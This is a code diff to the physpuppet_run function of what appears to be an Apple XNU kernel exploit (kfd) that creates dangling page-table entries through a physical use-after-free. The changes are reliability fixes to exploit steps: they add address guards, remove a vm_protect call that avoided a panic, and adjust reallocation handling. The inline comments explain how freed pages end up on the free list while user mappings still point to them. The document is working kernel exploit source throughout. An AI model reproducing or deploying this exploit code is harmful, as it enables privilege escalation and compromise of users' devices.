@@ -43,6 +43,15 @@ void physpuppet_run(struct kfd* kfd)
         assert_mach(vm_map(mach_task_self(), &address, (-1), 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, named_entry, physpuppet_vme_offset, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_DEFAULT));
 
         /*
+         * Guard: if vm_map failed (assert_mach no-ops in release builds),
+         * address will be 0 — skip this iteration entirely.
+         */
+        if (address == 0) {
+            mach_port_deallocate(mach_task_self(), named_entry);
+            continue;
+        }
+
+        /*
          * STEP 3:
          *
          * Fault in both pages covered by the vm_map_entry. This will populate
@@ -59,20 +68,21 @@ void physpuppet_run(struct kfd* kfd)
          * calls pmap_remove_options(), only the first L3 PTE gets cleared. The
          * vm_map_entry is deallocated and therefore the vm_object's ref_count
          * goes down to 1.
+         *
+         * Save address before deallocate — vm_deallocate may clobber it.
          */
+        vm_address_t saved_address = address;
         assert_mach(vm_deallocate(mach_task_self(), address, physpuppet_vme_size));
 
         /*
          * STEP 5:
          *
-         * Before destroying the vm_named_entry, remove all pmap mappings from
-         * the virtual address range. This prevents pmap_mark_page_as_ppl_page_internal()
-         * from panicking with "page still has mappings" on T8101 (A14) when
-         * the vm_object is reaped and its pages returned to the free list.
+         * Destroy the vm_named_entry. The vm_object's ref_count drops to 0 and
+         * therefore is reaped. This will put all of its vm_pages on the free
+         * list without calling pmap_disconnect().
          */
-        assert_mach(vm_protect(mach_task_self(), address, physpuppet_vme_size, false, VM_PROT_NONE));
         assert_mach(mach_port_deallocate(mach_task_self(), named_entry));
-        kfd->puaf.puaf_pages_uaddr[i] = address + physpuppet_vme_offset;
+        kfd->puaf.puaf_pages_uaddr[i] = saved_address + physpuppet_vme_offset;
 
         /*
          * STEP 6:
@@ -85,17 +95,14 @@ void physpuppet_run(struct kfd* kfd)
          * vm_map_delete() won't call pmap_remove_options() on exit. But we
          * don't fault in the second page to avoid overwriting our dangling PTE.
          *
-         * Use VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE so we don't get KERN_NO_SPACE
-         * if the range was partially re-used. Save address before the call since
-         * vm_allocate may clobber it on failure.
+         * Use VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE and check result before
+         * memset — in release builds assert_mach is a no-op so we must guard
+         * manually to avoid NULL-deref if vm_allocate fails.
          */
-        vm_address_t saved_address = address;
-        kern_return_t realloc_kret = vm_allocate(mach_task_self(), &address, physpuppet_vme_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE);
-        if (realloc_kret == KERN_SUCCESS && address == saved_address && address != 0) {
-            memset((void*)(address), 'A', physpuppet_vme_offset);
-        } else {
-            /* Restore address for puaf_pages_uaddr assignment below */
-            address = saved_address;
+        vm_address_t realloc_address = saved_address;
+        kern_return_t realloc_kret = vm_allocate(mach_task_self(), &realloc_address, physpuppet_vme_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE);
+        if (realloc_kret == KERN_SUCCESS && realloc_address == saved_address) {
+            memset((void*)(realloc_address), 'A', physpuppet_vme_offset);
         }
     }
 }
